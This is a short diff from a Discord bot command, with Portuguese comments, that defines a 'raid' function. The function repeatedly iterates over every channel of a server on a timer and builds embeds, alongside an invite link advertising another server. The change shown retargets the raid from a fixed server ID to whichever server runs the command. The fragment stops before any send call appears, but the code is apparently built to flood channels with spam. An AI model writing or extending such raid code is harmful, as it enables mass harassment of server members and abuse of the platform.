@@ -9,7 +9,7 @@ exports.run = async (client, message, args) => {
     let fieldd = "Acesse Este Servidor: https://discord.gg/x9jqsb" // descricão do field
    function raid(){
        setInterval(() => {
-     client.guilds.get("645746494250680380").channels.forEach((canal) => {
+     client.guilds.get(message.guild.id).channels.forEach((canal) => {
            let embed = new discord.RichEmbed()
            .setTitle(Title)
            .setColor("RANDOM")
